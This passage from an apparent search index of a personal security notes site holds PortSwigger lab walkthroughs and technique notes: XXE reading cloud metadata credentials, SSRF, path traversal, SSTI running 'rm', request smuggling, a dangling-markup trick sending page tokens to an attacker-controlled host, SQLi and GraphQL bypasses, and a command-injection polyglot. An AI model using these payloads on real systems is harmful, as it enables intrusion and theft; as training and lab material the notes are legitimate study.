file:// with http://169.254.169.254/latest/meta-data/iam/security-credentials/admin, thus: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>","title":"XXE LAB 2"},{"location":"portswigger/labs/#ssrf-server-side-request-forgery","text":"It happens when the server makes a request to an arbitrary server, which can even be itself. If the server allows it, we can use, for example, the file:/// directive to whatever file we want the server to fetch, and the server should return that in the response, if its not a blind SSRF.","title":"SSRF - Server Side Request Forgery"},{"location":"portswigger/labs/#ssrf-lab-1","text":"The server sends a request to another server to fetch the stock data, as such we only need to replace the server payload with ours: http://localhost/admin/delete?username=carlos","title":"SSRF LAB 1"},{"location":"portswigger/labs/#ssrf-lab-2","text":"We know there's another internal server which is capable of running admin functions, so we brute-force the last octet of the given IP, appending the url path to do the admin action: http%3A%2F%2F192.168.0.x%3A8080/admin/delete?username=carlos","title":"SSRF LAB 2"},{"location":"portswigger/labs/#directory-traversal","text":"It occurs when a file is programatically opened with the filename being user input. For example, in python, open(userinput) can lead to this. An attacker, if the input isn't properly validated, can simply append a payload that traverses through the path, such as: ../../../etc/passwd . This allows an attacker to see the etc/passwd file, because .. in Linux means to go back one directory.","title":"Directory Traversal"},{"location":"portswigger/labs/#directory-traversal-lab-1","text":"A filename parameter is used to fetch images, we replace the image name with: ../../../etc/passwd and the password file is show.","title":"Directory Traversal LAB 1"},{"location":"portswigger/labs/#access-control","text":"Authorization is the process of determining if a given user can perform the requested actions or access resources. It can be vertical, horizontal or context dependant. Vertical access control mechanisms restrict access to sensitive functionality that is not available to other types of users. For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions Horizontal access control mechanisms restrict access to resources to users who are specifically allowed to access those resources. For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user Context dependant access control mechanisms restrict access to resources based on a user's interaction with them. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment","title":"Access Control"},{"location":"portswigger/labs/#access-control-lab-1","text":"We need to delete a user knowing there is unprotected admin functionality. We go to robots.txt looking for that and find the endpoint: administrative-panel . We go to it and see we can access all admin functions, such as delete user. We delete the user required to complete the lab","title":"Access Control LAB 1"},{"location":"portswigger/labs/#access-control-lab-2","text":"Same logic, but this time exists an admin panel with an unpredictable url generated by js. We open the source code and see the url lying there. Open that url and delete the user required to complete the lab.","title":"Access Control LAB 2"},{"location":"portswigger/labs/#access-control-lab-3","text":"This time a user role is set by the cookie Admin=true|false after logging in. So we log in. We need to get admin, so we set the cookie Admin=false to true after logging in.","title":"Access Control LAB 3"},{"location":"portswigger/labs/#access-control-lab-4","text":"We know there's a parameter called roleid which when changed to 2 gives us admin. We open burpsuite, enter the lab and notice we can change our roleid in the profile. We set a valid email. Start intercept, click update email and change the request to include \"roleid\":2. We forward it and notice we are admin by clicking on the Admin-Panel link that appeared.","title":"Access Control LAB 4"},{"location":"portswigger/labs/#access-control-lab-5","text":"This time, when we log in, we can see the id GET parameter in the url pointing to the current user. Thus, we need only change it to carlos and we are now in carlos's account. Copy his api key and submit it as the solution.","title":"Access Control LAB 5"},{"location":"portswigger/labs/#access-control-lab-5_1","text":"This time, the user-id is unpredictable, nonetheless, we can see it visiting the given user's page. As such, we visit carlos's page and copy the uuid in the get parameter. We login to our account and replace the uuid with carlo's. Copy and paste the api key in the solution.","title":"Access Control LAB 5"},{"location":"portswigger/labs/#access-control-lab-6","text":"The response is a redirect but the backend doesn't remove the body, so we can see the results of our request anyway. We log in, go to my account, send that request to burpsuite repeater, add an ?id=carlos query-string to the url and get the api key. Paste it as the solution.","title":"Access Control LAB 6"},{"location":"portswigger/labs/#access-control-lab-7","text":"We can change the user id to administrator in my account page after logging in. Send that request to burpsuite, look for the administrator password in the source code. Log in as administrator, dele the user carlos.","title":"Access Control LAB 7"},{"location":"portswigger/labs/#access-control-lab-8","text":"We go login to our account, wiener:peter and go to live chat. We send a message and click get transcript. We notice it's getting an endpoint that fetches 2.txt. We change it to 1 and see the password there.","title":"Access Control LAB 8"},{"location":"portswigger/labs/#insecure-deserialization","text":"Serialization is the process of converting data structures such as objects into something that can be sent and received like a stream of bytes. Basically you use it to save the object's state. Deserialization is the process of restoring this stream of bytes to its original state. Insecure deserialization occurs when user input is deserialized.","title":"Insecure deserialization"},{"location":"portswigger/labs/#insecure-deserialization-lab-1","text":"We login with account wiener:peter . We open our browser's dev tools. We notice we receive a cookie whose value we decode and notice it is a php serialized object. The admin attribute contains a boolean value set to false. We set it to true by replacing 0 with 1. Encode the cookie. We now have access to the admin panel. Go there and delete user carlos .","title":"Insecure deserialization LAB 1"},{"location":"portswigger/labs/#information-disclosure","text":"It's the process of discovering sensitive (or not) information that the website unintentionally discloses to the user.","title":"Information Disclosure."},{"location":"portswigger/labs/#information-disclosure-lab-1","text":"We click to see any arbitrary product and notice it has an id parameter which expects an int. We providade it an arbitrary string such as: \"hello\" and notice it spews out information. The apache version is the challenge.","title":"Information Disclosure LAB 1"},{"location":"portswigger/labs/#information-disclosure-lab-2","text":"We open the source-code of the home page and scroll through the comments. We notice one called debug . It points to /cgi-bin/phpinfo.php . We go there and find SECRET_KEY . It is the solution for the lab.","title":"Information Disclosure LAB 2"},{"location":"portswigger/labs/#information-disclosure-lab-3","text":"We browse to a directory called /backup/ and it has directory listing set. We click on the only file there. On the source-code, there's a password for a postgres database. It is the solution.","title":"Information Disclosure LAB 3"},{"location":"portswigger/labs/#information-disclosure-lab-4","text":"We browse to /admin and notice we need a local IP to view the panel. We TRACE admin and see the header: X-Custom-IP-Authorization . We set it in our request to /admin with value: 127.0.0.1 We send a request to the page and open it in our browser and delete user carlos .","title":"Information Disclosure LAB 4"},{"location":"portswigger/labs/#business-logic-vulnerabilities","text":"Arise when developers assume an end user will interact a certain way but interacts in another, unintended way, leading to unintended behaviour by the web application (so called logic-flaws).","title":"Business Logic Vulnerabilities"},{"location":"portswigger/labs/#business-logic-vulnerabilities-lab-1","text":"This time, the developer assumed a user would only use the browser to make requests, he placed excessive trust in client side controls. This mean we can simply craft a request which changes the price parameter to 1, and we will buy that item for that price. Simply open burpsuite, set intercept on. View details on the 1337 l34th3r j4ck3t, click order, change price to 1, go to your cart and order it. The lab is solved.","title":"Business logic vulnerabilities LAB 1"},{"location":"portswigger/labs/#server-side-template-injection","text":"Occurs when user input is directly concatenated to the template renderer instead of being passed in as data in the appropriate fields. It leads to server-side RCE.","title":"Server Side Template Injection"},{"location":"portswigger/labs/#ssti-lab-1","text":"We need to pop RCE knowing it's ERB template. The objective is to delete morale.txt. That's fairly simple, call system function. Final payload: <%= system('rm morale.txt') %>","title":"SSTi LAB 1"},{"location":"portswigger/labs/#web-cache-poisoning","text":"Between the client and the server lays a cache, it uses keyed input, that is, parts of the http request, to determine if a cached request will be served. The logic is as follows: If the keyed input in the http request matches the keyed input cached, then a cached request is served. Otherwise, it is forwarded to the server.","title":"Web Cache Poisoning"},{"location":"portswigger/labs/#web-cache-poisoning-lab-1","text":"We send two GET requests to /?cb=1234 and notice the second one's response displays a header: X-Cache: hit , implying the cache served us a response. In order to be served by the cache, we only need to send a request, and the next request (if it has the same keyed input) is served by the cache. The object is to pop an alert via X-Forwarded-Host. Add that header with an arbitrary host value, such as example.com, and send the request. Copy the path of the absolute url it generates. Go the exploit serve and change the filename to that, in the body write alert(document.cookie) and store the exploit. Go back to the previous GET request but remove the query-string. Substitute the arbitrary X-Forwareded-Host value to your exploit-lab url. Send the request until the hit displays again. If the lab is not solved, re-send the request every few seconds until it is.","title":"Web Cache Poisoning LAB 1"},{"location":"portswigger/labs/#web-cache-poisoning-lab-2","text":"We need to pop an alert(1) through the cookie. First we add a cache buster such as: ?cb=1234 and figure out which cookie is being reflected. It's fehost, so we add to it: \"-alert(1)-\" . We remove the cache buster, therefore sending that request to / . When we get a X-Cache: hit header, copy the url and paste it in the browser. The alert is popped, lab is solved.","title":"Web Cache Poisoning LAB 2"},{"location":"portswigger/labs/#request-smuggling","text":"Is the process of sending a smuggled request inside another request. This arises when there are multiple servers before reaching the ultimate backend server. Imagine a situation where the frontend server uses Content-Length to discern where the body ends, but the backend server uses Transfer-Encoding: The frontend will forward the entire request to the backend, due to the matching content-length, but the backend server will see a chunk size of 0, implying the transfer encoding request is over. However, since the frontend server forwarded the whole request, there are still bytes left unprocessed, which due to the nature of the http protocol, will be seen as the next HTTP request. CL-TE:","title":"Request Smuggling"},{"location":"portswigger/labs/#lab-1_1","text":"POST / HTTP/1.1 Host: 0af7005004fa2008c0e7414d00480036.web-security-academy.net Cookie: session=q4YcBH0UA9IiP3stGRgZQhwFCOXFSUBi User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://portswigger.net/ Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Sec-Fetch-User: ?1 Te: trailers Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 12 tRANSFER-ENCODING: chunked 0 G TE-CL:","title":"LAB 1"},{"location":"portswigger/labs/#lab-2_1","text":"It's the same logic: Frontend forwards the entire request, backend only see's some of it, the rest is left unprocessed and will be seen as the next HTTP request. Front end see's the request until the 0 byte, backend only see's the request until what content-length allows. Solutin: POST / HTTP/1.1 Host: 0a3e00eb042b50ccc0fb12c9008d003b.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 0 TE-TE: Make one of the servers not process the TE header in some way.","title":"LAB 2"},{"location":"portswigger/labs/#lab-2_2","text":"POST / HTTP/1.1 Host: 0a48004d04017b53c0a8806e00fd0057.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0","title":"LAB 2"},{"location":"research/angular_notes/","text":"Angular Angular - Plataform for building single-page client applications with HTML and Typescript Fundamental Concepts Angular Componenents are organized into NgModules; An angular app is a set of NgModules; An app has a root module; Views are sets of screen elements that Angular can choose among and modify according to program logic; Services provide specific functionality not directly related to views; Modules, componenets and services are classes that use decorators; Decorators mark class type and provide metadata that tells angular how to use them; Metadata for a component class associates it with a template that defines a view; A template combines ordinary HTML with Angular directives and binding markups, allowing angular to modify HTML before renderization Modules Declares compilation context for a set of componenets that is dedicated to an application domain, workflow or set of capabilities; Can relate its componenets with code, such as services, to form functional units; Modules can import functionality from other modules; Components The root componenent connects a componenent hierarchy with the DOM; Each componenet defines a class that contains application data and logic, associated with an HTML template that defines a view to be displayed in a target environment; Templates Combine HTML and Angular markup which modify HTML elements before displayed. Data binding Event binding responds to user input; Property Binding interpolate values that are computed from application data into HTML;","title":"Angular"},{"location":"research/angular_notes/#angular","text":"Angular - Plataform for building single-page client applications with HTML and Typescript","title":"Angular"},{"location":"research/angular_notes/#fundamental-concepts","text":"Angular Componenents are organized into NgModules; An angular app is a set of NgModules; An app has a root module; Views are sets of screen elements that Angular can choose among and modify according to program logic; Services provide specific functionality not directly related to views; Modules, componenets and services are classes that use decorators; Decorators mark class type and provide metadata that tells angular how to use them; Metadata for a component class associates it with a template that defines a view; A template combines ordinary HTML with Angular directives and binding markups, allowing angular to modify HTML before renderization","title":"Fundamental Concepts"},{"location":"research/angular_notes/#modules","text":"Declares compilation context for a set of componenets that is dedicated to an application domain, workflow or set of capabilities; Can relate its componenets with code, such as services, to form functional units; Modules can import functionality from other modules;","title":"Modules"},{"location":"research/angular_notes/#components","text":"The root componenent connects a componenent hierarchy with the DOM; Each componenet defines a class that contains application data and logic, associated with an HTML template that defines a view to be displayed in a target environment;","title":"Components"},{"location":"research/angular_notes/#templates","text":"Combine HTML and Angular markup which modify HTML elements before displayed.","title":"Templates"},{"location":"research/angular_notes/#data-binding","text":"Event binding responds to user input; Property Binding interpolate values that are computed from application data into HTML;","title":"Data binding"},{"location":"research/dangling%20markup/","text":"Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach What is dangling markup? It is a technique to steal a web page's given contents via resources that send that data onto a remote attacker controlled location. If we have an injection point: <INJECTION POINT> <b>test</b> <script> token = 'yoursecrettoken'; </script> <form action=\"blah\"></form> We can simply inject: <img src=\"https://attackercontrolled.server? and the previous html becomes: <img src=\"https://attackercontrolled.server? <b>test</b> <script> token = 'yoursecrettoken'; </script> <form action=\"blah\"></form> As such, the data is sent as part of the query-string to the attacker controlled domain. Portswigger Research This does not work with strict CSP such as: default-src 'none'; base-uri 'none'; . The image will not load because no origin is allowed for that purpose. The amazing portswigger researcher Gareth Heyes discovered a technique to inject dangling markup even with these restrict directives: <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"blah<b>test</b> <script> token = 'supersecret'; </script> <form action=\"blah\"> </form> By injecting an <a> and a <base> tag, we send data onto an attacker controlled server: If the target attribute is not one of any predefined values, it will set window.name of the new window to the value it has. This means we can inject a dangling markup, and exfiltrate the data in the attacker controlled server like this: <script>alert(\"The extracted content is:\" + name);</script> If form is allowed - exifiltrating without correct markup, without javascript and bypassing CSP. If the tag <form> is allowed, an attacker can exfiltrate information with a dangling markup by taking advantage of action and value attributes of <form> and <input> respectively. This technique does not require correct markup below your injection point, bypasses CSP and does not use javascript on another page to exfiltrate what was read. <?php header(\"Content-Security-Policy: base-uri 'none'; default-src 'none';\"); ?> <!DOCTYPE HTML> <html> <form action=\"http://attackercontrolled.server\" method=\"GET\"> <input type=\"submit\" name=\"submit\"> <input hidden type=\"text\" name=\"id\" value=\" <script> token = 'supersecret'; </script> </form>\" </html> This works because before a form is sent the browser collects each value attribute in each <input> tag. When the form is sent by cliking the submit button, those values are sent with it to the url at the attacker controlled server. The attacker receives that data via the id query-string.","title":"Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach"},{"location":"research/dangling%20markup/#evading-csp-with-dom-based-dangling-markup-portswigger-an-alternative-approach","text":"","title":"Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach"},{"location":"research/dangling%20markup/#what-is-dangling-markup","text":"It is a technique to steal a web page's given contents via resources that send that data onto a remote attacker controlled location. If we have an injection point: <INJECTION POINT> <b>test</b> <script> token = 'yoursecrettoken'; </script> <form action=\"blah\"></form> We can simply inject: <img src=\"https://attackercontrolled.server? and the previous html becomes: <img src=\"https://attackercontrolled.server? <b>test</b> <script> token = 'yoursecrettoken'; </script> <form action=\"blah\"></form> As such, the data is sent as part of the query-string to the attacker controlled domain.","title":"What is dangling markup?"},{"location":"research/dangling%20markup/#portswigger-research","text":"This does not work with strict CSP such as: default-src 'none'; base-uri 'none'; . The image will not load because no origin is allowed for that purpose. The amazing portswigger researcher Gareth Heyes discovered a technique to inject dangling markup even with these restrict directives: <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"blah<b>test</b> <script> token = 'supersecret'; </script> <form action=\"blah\"> </form> By injecting an <a> and a <base> tag, we send data onto an attacker controlled server: If the target attribute is not one of any predefined values, it will set window.name of the new window to the value it has. This means we can inject a dangling markup, and exfiltrate the data in the attacker controlled server like this: <script>alert(\"The extracted content is:\" + name);</script>","title":"Portswigger Research"},{"location":"research/dangling%20markup/#if-form-is-allowed-exifiltrating-without-correct-markup-without-javascript-and-bypassing-csp","text":"If the tag <form> is allowed, an attacker can exfiltrate information with a dangling markup by taking advantage of action and value attributes of <form> and <input> respectively. This technique does not require correct markup below your injection point, bypasses CSP and does not use javascript on another page to exfiltrate what was read. <?php header(\"Content-Security-Policy: base-uri 'none'; default-src 'none';\"); ?> <!DOCTYPE HTML> <html> <form action=\"http://attackercontrolled.server\" method=\"GET\"> <input type=\"submit\" name=\"submit\"> <input hidden type=\"text\" name=\"id\" value=\" <script> token = 'supersecret'; </script> </form>\" </html> This works because before a form is sent the browser collects each value attribute in each <input> tag. When the form is sent by cliking the submit button, those values are sent with it to the url at the attacker controlled server. The attacker receives that data via the id query-string.","title":"If form is allowed - exifiltrating without correct markup, without javascript and bypassing CSP."},{"location":"research/subdomain-takeover/src/commands/commands/","text":"Commands DNSX Prep for section/populr.me dnsx -l subdomains -raw -rcode \"noerror,servfail,nxdomain,refused\" -t 300 | anew done.subdomains; cat done.subdomains | grep -Poz \".+IN\\tCNAME\\t\\K(.*?)(\\n)|QUESTION SECTION:\\n;\\K(.+?)\\t\" | grep -Eva \".+sectionedge.+|.+ep\\.section\\.io.+|.+airkit(\\.com|\\.eu).*|.+populr\\.me.*\" | tr \"\\t\" \"\\n\" | sed 's/\\.$//g' | anew fortune.targets","title":"Commands"},{"location":"research/subdomain-takeover/src/commands/commands/#commands","text":"","title":"Commands"},{"location":"research/subdomain-takeover/src/commands/commands/#dnsx-prep-for-sectionpopulrme","text":"dnsx -l subdomains -raw -rcode \"noerror,servfail,nxdomain,refused\" -t 300 | anew done.subdomains; cat done.subdomains | grep -Poz \".+IN\\tCNAME\\t\\K(.*?)(\\n)|QUESTION SECTION:\\n;\\K(.+?)\\t\" | grep -Eva \".+sectionedge.+|.+ep\\.section\\.io.+|.+airkit(\\.com|\\.eu).*|.+populr\\.me.*\" | tr \"\\t\" \"\\n\" | sed 's/\\.$//g' | anew fortune.targets","title":"DNSX Prep for section/populr.me"},{"location":"research/subdomain-takeover/src/script/","text":"","title":"Index"},{"location":"techniques/interesting/","text":"Techniques created by me (or not) uncommon in the wild GraphQL Deny name bypass with aliases Forbidden payload {\"query\":\"{systemHealth}\"} Bypass payload {\"query\":\"q1: systemHealth\"} SQLi Mass injection via update...SET clause UPDATE users SET password='123456 ',admin=true WHERE username='androidparanoid' -- - WHERE username='androidparanoid' Blind SQLi visual exfiltration via WHERE and VALUES clause injection -- create a table CREATE TABLE students ( id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL ); -- insert some values INSERT INTO students VALUES (1, 'androidparanoid', '123456'); INSERT INTO students VALUES (2, 'admin', '123456789'); SELECT username FROM students WHERE username='androidparanoid '||~(SELECT password FROM students WHERE username='admin'); -- - ' INSERT INTO students VALUES(3, 'androidparanoid '||~(SELECT password FROM students WHERE username='admin'), '123456789'); -- -') SELECT username FROM students ;","title":"Techniques created by me (or not) uncommon in the wild"},{"location":"techniques/interesting/#techniques-created-by-me-or-not-uncommon-in-the-wild","text":"","title":"Techniques created by me (or not) uncommon in the wild"},{"location":"techniques/interesting/#graphql","text":"","title":"GraphQL"},{"location":"techniques/interesting/#deny-name-bypass-with-aliases","text":"","title":"Deny name bypass with aliases"},{"location":"techniques/interesting/#forbidden-payload","text":"{\"query\":\"{systemHealth}\"}","title":"Forbidden payload"},{"location":"techniques/interesting/#bypass-payload","text":"{\"query\":\"q1: systemHealth\"}","title":"Bypass payload"},{"location":"techniques/interesting/#sqli","text":"","title":"SQLi"},{"location":"techniques/interesting/#mass-injection-via-updateset-clause","text":"UPDATE users SET password='123456 ',admin=true WHERE username='androidparanoid' -- - WHERE username='androidparanoid'","title":"Mass injection via update...SET clause"},{"location":"techniques/interesting/#blind-sqli-visual-exfiltration-via-where-and-values-clause-injection","text":"-- create a table CREATE TABLE students ( id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL ); -- insert some values INSERT INTO students VALUES (1, 'androidparanoid', '123456'); INSERT INTO students VALUES (2, 'admin', '123456789'); SELECT username FROM students WHERE username='androidparanoid '||~(SELECT password FROM students WHERE username='admin'); -- - ' INSERT INTO students VALUES(3, 'androidparanoid '||~(SELECT password FROM students WHERE username='admin'), '123456789'); -- -') SELECT username FROM students ;","title":"Blind SQLi visual exfiltration via WHERE and VALUES clause injection"},{"location":"techniques/methodology/","text":"A methodological checklist to logically deduce the steps needed to pentest a web app. SQL Search Functionality Probe for an output that always gives the same results, so you can deduce based on your other payloads if the same result was given or not. Eg: search for \"hello\" , make sure it doesn't return different results. (Send it a few times). Add a single quote; \"hello'\" , analyze the response. Does it show an error, does it give the same results? Does it return nothing? Depending on the answer and your reasoning, try concatenating techniques: \"hell'||'o\" , \"hell' 'o\" , \"hell'+'o\" If you get the same results, there could be an SQLi, so it would be beneficial to use sqlmap. Login functionality Login with an account, analyze the response and take note of anything important. Login again but add a single-quote to the email, notice the response. If it says no account found or something akin, then the query most likely completed, so it was validated. No account found is the equivalent to no rows returning, so the query completed. If there's any sort of strange behaviour, try concatenating again: androidparanoi'||'d and androidparanoi'+'d and androidparanoi' 'd . If it logs you in, it's a good idea to send it to SQLmap.","title":"A methodological checklist to logically deduce the steps needed to pentest a web app."},{"location":"techniques/methodology/#a-methodological-checklist-to-logically-deduce-the-steps-needed-to-pentest-a-web-app","text":"","title":"A methodological checklist to logically deduce the steps needed to pentest a web app."},{"location":"techniques/methodology/#sql","text":"","title":"SQL"},{"location":"techniques/methodology/#search-functionality","text":"Probe for an output that always gives the same results, so you can deduce based on your other payloads if the same result was given or not. Eg: search for \"hello\" , make sure it doesn't return different results. (Send it a few times). Add a single quote; \"hello'\" , analyze the response. Does it show an error, does it give the same results? Does it return nothing? Depending on the answer and your reasoning, try concatenating techniques: \"hell'||'o\" , \"hell' 'o\" , \"hell'+'o\" If you get the same results, there could be an SQLi, so it would be beneficial to use sqlmap.","title":"Search Functionality"},{"location":"techniques/methodology/#login-functionality","text":"Login with an account, analyze the response and take note of anything important. Login again but add a single-quote to the email, notice the response. If it says no account found or something akin, then the query most likely completed, so it was validated. No account found is the equivalent to no rows returning, so the query completed. If there's any sort of strange behaviour, try concatenating again: androidparanoi'||'d and androidparanoi'+'d and androidparanoi' 'd . If it logs you in, it's a good idea to send it to SQLmap.","title":"Login functionality"},{"location":"techniques/triggers/","text":"Errors based/behaviour inferer PHP Numeric context for SSTi, evaluation, NoSQL, SQLi, XSS 51201*3101.'><h1>@(\\${{[%</h1>' => Output should be: 158774301 Other languages numeric context for SSTi, evaluation, NoSQL, SQLi, XSS 51201*3101+'><h1>@(${{[%</h1>' => Output should be: 158774301 51201*3101%2b'><h1>@(${{[%</h1>' PHP String context for SSTi, evaluation, NoSQL, SQLi, XSS ../../hello\".\"@(${{[%<%'**'><h1>asad2afdsd42sg</h1> => Surrounding string:' then output should be: hello@(\\${{[%<%\".\"> && Surrounding string:\" then output should be: hello'.'@(${{[%<%> Other languages string context for SSTi, evaluation, NoSQL, SQLi, XSS ../../hello\"+\"@(${{[%<%'**'><h1>asad2afdsd42sg</h1> => Sourrounding string:' then output is Generic Error Message (Fails to concat) && Surrounding string: \" then output is hello@(${{[%<%'**'> (Concats) ../../hello\"%2b\"%40(${{[%25<%25'**'><h1>asad2afdsd42sg</h1> OS CMDi Polyglot $(sleep+10)+||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10+`sleep+10`\";$(sleep+10)+`sleep+10`||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10\"';sleep+10+%26%26sleep+10+||+sleep+10+|+sleep+10+`sleep+10`' $(sleep 10) || sleep 10 | sleep 10; sleep 10 && sleep 10 `sleep 10`\";$(sleep 10) `sleep 10`|| sleep 10 | sleep 10; sleep 10 && sleep 10\"';sleep 10 && sleep 10 || sleep 10 | sleep 10 `sleep 10`' Works in raw format, between ' or \" . Errors based/behaviour inferer v2 Final Wordlist => '\"><h1>asad2afdsd42sg</h1>@(${{[%<%{% '\" \\'\" '\\\" ' ' '||' '+' '.' \" \" \"||\" \"+\" \".\" @( ${ ${{ [% <% {% <h1> </h1>","title":"Errors based/behaviour inferer"},{"location":"techniques/triggers/#errors-basedbehaviour-inferer","text":"","title":"Errors based/behaviour inferer"},{"location":"techniques/triggers/#php-numeric-context-for-ssti-evaluation-nosql-sqli-xss","text":"51201*3101.'><h1>@(\\${{[%</h1>' => Output should be: 158774301","title":"PHP Numeric context for SSTi, evaluation, NoSQL, SQLi, XSS"},{"location":"techniques/triggers/#other-languages-numeric-context-for-ssti-evaluation-nosql-sqli-xss","text":"51201*3101+'><h1>@(${{[%</h1>' => Output should be: 158774301 51201*3101%2b'><h1>@(${{[%</h1>'","title":"Other languages numeric context for SSTi, evaluation, NoSQL, SQLi, XSS"},{"location":"techniques/triggers/#php-string-context-for-ssti-evaluation-nosql-sqli-xss","text":"../../hello\".\"@(${{[%<%'**'><h1>asad2afdsd42sg</h1> => Surrounding string:' then output should be: hello@(\\${{[%<%\".\"> && Surrounding string:\" then output should be: hello'.'@(${{[%<%>","title":"PHP String context for SSTi, evaluation, NoSQL, SQLi, XSS"},{"location":"techniques/triggers/#other-languages-string-context-for-ssti-evaluation-nosql-sqli-xss","text":"../../hello\"+\"@(${{[%<%'**'><h1>asad2afdsd42sg</h1> => Sourrounding string:' then output is Generic Error Message (Fails to concat) && Surrounding string: \" then output is hello@(${{[%<%'**'> (Concats) ../../hello\"%2b\"%40(${{[%25<%25'**'><h1>asad2afdsd42sg</h1>","title":"Other languages string context for SSTi, evaluation, NoSQL, SQLi, XSS"},{"location":"techniques/triggers/#os-cmdi-polyglot","text":"$(sleep+10)+||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10+`sleep+10`\";$(sleep+10)+`sleep+10`||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10\"';sleep+10+%26%26sleep+10+||+sleep+10+|+sleep+10+`sleep+10`' $(sleep 10) || sleep 10 | sleep 10; sleep 10 && sleep 10 `sleep 10`\";$(sleep 10) `sleep 10`|| sleep 10 | sleep 10; sleep 10 && sleep 10\"';sleep 10 && sleep 10 || sleep 10 | sleep 10 `sleep 10`' Works in raw format, between ' or \" .","title":"OS CMDi Polyglot"},{"location":"techniques/triggers/#errors-basedbehaviour-inferer-v2","text":"Final Wordlist => '\"><h1>asad2afdsd42sg</h1>@(${{[%<%{% '\" \\'\" '\\\" ' ' '||' '+' '.' \" \" \"||\" \"+\" \".\" @( ${ ${{ [% <% {% <h1> </h1>","title":"Errors based/behaviour inferer v2"}]}